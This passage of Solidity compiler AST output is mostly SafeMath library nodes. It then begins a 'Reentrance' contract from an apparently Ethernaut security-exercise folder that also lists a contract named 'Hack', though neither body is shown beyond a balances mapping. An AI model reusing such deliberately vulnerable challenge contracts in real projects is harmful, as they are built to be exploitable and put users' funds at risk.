										],
										"src": "4274:9:0"
									},
									"scope": 354,
									"src": "4217:150:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 280,
										"nodeType": "Block",
										"src": "4887:81:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 272,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 270,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 264,
																"src": "4905:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 271,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "4909:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "4905:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"hexValue": "536166654d6174683a206d6f64756c6f206279207a65726f",
															"id": 273,
															"isConstant": false,
															"isLValue": false,
															"isPure": true,
															"kind": "string",
															"lValueRequested": false,
															"nodeType": "Literal",
															"src": "4912:26:0",
															"subdenomination": null,
															"typeDescriptions": {
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															},
															"value": "SafeMath: modulo by zero"
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_stringliteral_726e51f7b81fce0a68f5f214f445e275313b20b1633f08ce954ee39abf8d7832",
																"typeString": "literal_string \"SafeMath: modulo by zero\""
															}
														],
														"id": 269,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "4897:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 274,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "4897:42:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 275,
												"nodeType": "ExpressionStatement",
												"src": "4897:42:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 278,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 276,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 262,
														"src": "4956:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"argumentTypes": null,
														"id": 277,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 264,
														"src": "4960:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "4956:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 268,
												"id": 279,
												"nodeType": "Return",
												"src": "4949:12:0"
											}
										]
									},
									"documentation": {
										"id": 260,
										"nodeType": "StructuredDocumentation",
										"src": "4373:442:0",
										"text": " @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n reverting when dividing by zero.\n Counterpart to Solidity's `%` operator. This function uses a `revert`\n opcode (which leaves remaining gas untouched) while Solidity uses an\n invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 281,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 265,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 262,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 281,
												"src": "4833:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 261,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4833:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 264,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 281,
												"src": "4844:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 263,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4844:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4832:22:0"
									},
									"returnParameters": {
										"id": 268,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 267,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 281,
												"src": "4878:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 266,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "4878:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "4877:9:0"
									},
									"scope": 354,
									"src": "4820:148:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 304,
										"nodeType": "Block",
										"src": "5527:68:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 296,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 294,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 286,
																"src": "5545:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": "<=",
															"rightExpression": {
																"argumentTypes": null,
																"id": 295,
																"name": "a",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 284,
																"src": "5550:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"src": "5545:6:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 297,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 288,
															"src": "5553:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 293,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "5537:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 298,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "5537:29:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 299,
												"nodeType": "ExpressionStatement",
												"src": "5537:29:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 302,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 300,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 284,
														"src": "5583:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "-",
													"rightExpression": {
														"argumentTypes": null,
														"id": 301,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 286,
														"src": "5587:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "5583:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 292,
												"id": 303,
												"nodeType": "Return",
												"src": "5576:12:0"
											}
										]
									},
									"documentation": {
										"id": 282,
										"nodeType": "StructuredDocumentation",
										"src": "4974:453:0",
										"text": " @dev Returns the subtraction of two unsigned integers, reverting with custom message on\n overflow (when the result is negative).\n CAUTION: This function is deprecated because it requires allocating memory for the error\n message unnecessarily. For custom revert reasons use {trySub}.\n Counterpart to Solidity's `-` operator.\n Requirements:\n - Subtraction cannot overflow."
									},
									"id": 305,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "sub",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 289,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 284,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 305,
												"src": "5445:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 283,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5445:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 286,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 305,
												"src": "5456:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 285,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5456:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 288,
												"mutability": "mutable",
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 305,
												"src": "5467:26:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 287,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "5467:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5444:50:0"
									},
									"returnParameters": {
										"id": 292,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 291,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 305,
												"src": "5518:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 290,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "5518:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "5517:9:0"
									},
									"scope": 354,
									"src": "5432:163:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 328,
										"nodeType": "Block",
										"src": "6347:67:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 320,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 318,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 310,
																"src": "6365:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 319,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "6369:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "6365:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 321,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 312,
															"src": "6372:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 317,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "6357:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 322,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "6357:28:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 323,
												"nodeType": "ExpressionStatement",
												"src": "6357:28:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 326,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 324,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 308,
														"src": "6402:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "/",
													"rightExpression": {
														"argumentTypes": null,
														"id": 325,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 310,
														"src": "6406:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "6402:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 316,
												"id": 327,
												"nodeType": "Return",
												"src": "6395:12:0"
											}
										]
									},
									"documentation": {
										"id": 306,
										"nodeType": "StructuredDocumentation",
										"src": "5601:646:0",
										"text": " @dev Returns the integer division of two unsigned integers, reverting with custom message on\n division by zero. The result is rounded towards zero.\n CAUTION: This function is deprecated because it requires allocating memory for the error\n message unnecessarily. For custom revert reasons use {tryDiv}.\n Counterpart to Solidity's `/` operator. Note: this function uses a\n `revert` opcode (which leaves remaining gas untouched) while Solidity\n uses an invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 329,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "div",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 313,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 308,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 329,
												"src": "6265:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 307,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6265:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 310,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 329,
												"src": "6276:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 309,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6276:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 312,
												"mutability": "mutable",
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 329,
												"src": "6287:26:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 311,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "6287:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6264:50:0"
									},
									"returnParameters": {
										"id": 316,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 315,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 329,
												"src": "6338:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 314,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "6338:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "6337:9:0"
									},
									"scope": 354,
									"src": "6252:162:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								},
								{
									"body": {
										"id": 352,
										"nodeType": "Block",
										"src": "7155:67:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [
														{
															"argumentTypes": null,
															"commonType": {
																"typeIdentifier": "t_uint256",
																"typeString": "uint256"
															},
															"id": 344,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"leftExpression": {
																"argumentTypes": null,
																"id": 342,
																"name": "b",
																"nodeType": "Identifier",
																"overloadedDeclarations": [],
																"referencedDeclaration": 334,
																"src": "7173:1:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_uint256",
																	"typeString": "uint256"
																}
															},
															"nodeType": "BinaryOperation",
															"operator": ">",
															"rightExpression": {
																"argumentTypes": null,
																"hexValue": "30",
																"id": 343,
																"isConstant": false,
																"isLValue": false,
																"isPure": true,
																"kind": "number",
																"lValueRequested": false,
																"nodeType": "Literal",
																"src": "7177:1:0",
																"subdenomination": null,
																"typeDescriptions": {
																	"typeIdentifier": "t_rational_0_by_1",
																	"typeString": "int_const 0"
																},
																"value": "0"
															},
															"src": "7173:5:0",
															"typeDescriptions": {
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															}
														},
														{
															"argumentTypes": null,
															"id": 345,
															"name": "errorMessage",
															"nodeType": "Identifier",
															"overloadedDeclarations": [],
															"referencedDeclaration": 336,
															"src": "7180:12:0",
															"typeDescriptions": {
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														}
													],
													"expression": {
														"argumentTypes": [
															{
																"typeIdentifier": "t_bool",
																"typeString": "bool"
															},
															{
																"typeIdentifier": "t_string_memory_ptr",
																"typeString": "string memory"
															}
														],
														"id": 341,
														"name": "require",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-18,
															-18
														],
														"referencedDeclaration": -18,
														"src": "7165:7:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_require_pure$_t_bool_$_t_string_memory_ptr_$returns$__$",
															"typeString": "function (bool,string memory) pure"
														}
													},
													"id": 346,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "7165:28:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 347,
												"nodeType": "ExpressionStatement",
												"src": "7165:28:0"
											},
											{
												"expression": {
													"argumentTypes": null,
													"commonType": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													},
													"id": 350,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftExpression": {
														"argumentTypes": null,
														"id": 348,
														"name": "a",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 332,
														"src": "7210:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"nodeType": "BinaryOperation",
													"operator": "%",
													"rightExpression": {
														"argumentTypes": null,
														"id": 349,
														"name": "b",
														"nodeType": "Identifier",
														"overloadedDeclarations": [],
														"referencedDeclaration": 334,
														"src": "7214:1:0",
														"typeDescriptions": {
															"typeIdentifier": "t_uint256",
															"typeString": "uint256"
														}
													},
													"src": "7210:5:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"functionReturnParameters": 340,
												"id": 351,
												"nodeType": "Return",
												"src": "7203:12:0"
											}
										]
									},
									"documentation": {
										"id": 330,
										"nodeType": "StructuredDocumentation",
										"src": "6420:635:0",
										"text": " @dev Returns the remainder of dividing two unsigned integers. (unsigned integer modulo),\n reverting with custom message when dividing by zero.\n CAUTION: This function is deprecated because it requires allocating memory for the error\n message unnecessarily. For custom revert reasons use {tryMod}.\n Counterpart to Solidity's `%` operator. This function uses a `revert`\n opcode (which leaves remaining gas untouched) while Solidity uses an\n invalid opcode to revert (consuming all remaining gas).\n Requirements:\n - The divisor cannot be zero."
									},
									"id": 353,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "mod",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 337,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 332,
												"mutability": "mutable",
												"name": "a",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 353,
												"src": "7073:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 331,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "7073:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 334,
												"mutability": "mutable",
												"name": "b",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 353,
												"src": "7084:9:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 333,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "7084:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											},
											{
												"constant": false,
												"id": 336,
												"mutability": "mutable",
												"name": "errorMessage",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 353,
												"src": "7095:26:0",
												"stateVariable": false,
												"storageLocation": "memory",
												"typeDescriptions": {
													"typeIdentifier": "t_string_memory_ptr",
													"typeString": "string"
												},
												"typeName": {
													"id": 335,
													"name": "string",
													"nodeType": "ElementaryTypeName",
													"src": "7095:6:0",
													"typeDescriptions": {
														"typeIdentifier": "t_string_storage_ptr",
														"typeString": "string"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7072:50:0"
									},
									"returnParameters": {
										"id": 340,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 339,
												"mutability": "mutable",
												"name": "",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 353,
												"src": "7146:7:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_uint256",
													"typeString": "uint256"
												},
												"typeName": {
													"id": 338,
													"name": "uint256",
													"nodeType": "ElementaryTypeName",
													"src": "7146:7:0",
													"typeDescriptions": {
														"typeIdentifier": "t_uint256",
														"typeString": "uint256"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "7145:9:0"
									},
									"scope": 354,
									"src": "7060:162:0",
									"stateMutability": "pure",
									"virtual": false,
									"visibility": "internal"
								}
							],
							"scope": 355,
							"src": "630:6594:0"
						}
					],
					"src": "33:7192:0"
				},
				"id": 0
			},
			"security/etheranut/Reentrance/Reentrance.sol": {
				"ast": {
					"absolutePath": "security/etheranut/Reentrance/Reentrance.sol",
					"exportedSymbols": {
						"Hack": [
							576
						],
						"Reentrance": [
							435
						]
					},
					"id": 577,
					"license": "MIT",
					"nodeType": "SourceUnit",
					"nodes": [
						{
							"id": 356,
							"literals": [
								"solidity",
								"^",
								"0.6",
								".12"
							],
							"nodeType": "PragmaDirective",
							"src": "33:24:1"
						},
						{
							"absolutePath": "@openzeppelin/contracts/math/SafeMath.sol",
							"file": "@openzeppelin/contracts/math/SafeMath.sol",
							"id": 357,
							"nodeType": "ImportDirective",
							"scope": 577,
							"sourceUnit": 355,
							"src": "61:51:1",
							"symbolAliases": [],
							"unitAlias": ""
						},
						{
							"abstract": false,
							"baseContracts": [],
							"contractDependencies": [],
							"contractKind": "contract",
							"documentation": null,
							"fullyImplemented": true,
							"id": 435,
							"linearizedBaseContracts": [
								435
							],
							"name": "Reentrance",
							"nodeType": "ContractDefinition",
							"nodes": [
								{
									"id": 360,
									"libraryName": {
										"contractScope": null,
										"id": 358,
										"name": "SafeMath",
										"nodeType": "UserDefinedTypeName",
										"referencedDeclaration": 354,
										"src": "149:8:1",
										"typeDescriptions": {
											"typeIdentifier": "t_contract$_SafeMath_$354",
											"typeString": "library SafeMath"
										}
									},
									"nodeType": "UsingForDirective",
									"src": "143:27:1",
									"typeName": {
										"id": 359,
										"name": "uint256",
										"nodeType": "ElementaryTypeName",
										"src": "162:7:1",
										"typeDescriptions": {
											"typeIdentifier": "t_uint256",
											"typeString": "uint256"
										}
									}
								},
								{
									"constant": false,
									"functionSelector": "27e235e3",
									"id": 364,
									"mutability": "mutable",
									"name": "balances",
									"nodeType": "VariableDeclaration",
									"overrides": null,
									"scope": 435,
									"src": "178:43:1",
									"stateVariable": true,
									"storageLocation": "default",
									"typeDescriptions": {
										"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
										"typeString": "mapping(address => uint256)"
									},
									"typeName": {
										"id": 363,
										"keyType": {
											"id": 361,
											"name": "address",
											"nodeType": "ElementaryTypeName",
											"src": "186:7:1",
											"typeDescriptions": {
												"typeIdentifier": "t_address",
												"typeString": "address"
											}
										},
										"nodeType": "Mapping",
										"src": "178:27:1",
										"typeDescriptions": {
											"typeIdentifier": "t_mapping$_t_address_$_t_uint256_$",
											"typeString": "mapping(address => uint256)"
										},
										"valueType": {
											"id": 362,
											"name": "uint256",
											"nodeType": "ElementaryTypeName",
											"src": "197:7:1",
											"typeDescriptions": {
												"typeIdentifier": "t_uint256",
												"typeString": "uint256"
											}
										}
									},
									"value": null,
									"visibility": "public"
								},
								{
									"body": {
										"id": 381,
										"nodeType": "Block",
										"src": "274:63:1",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"id": 379,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"lValueRequested": false,
													"leftHandSide": {
														"argumentTypes": null,
														"baseExpression": {
															"argumentTypes": null,
															"id": 369,
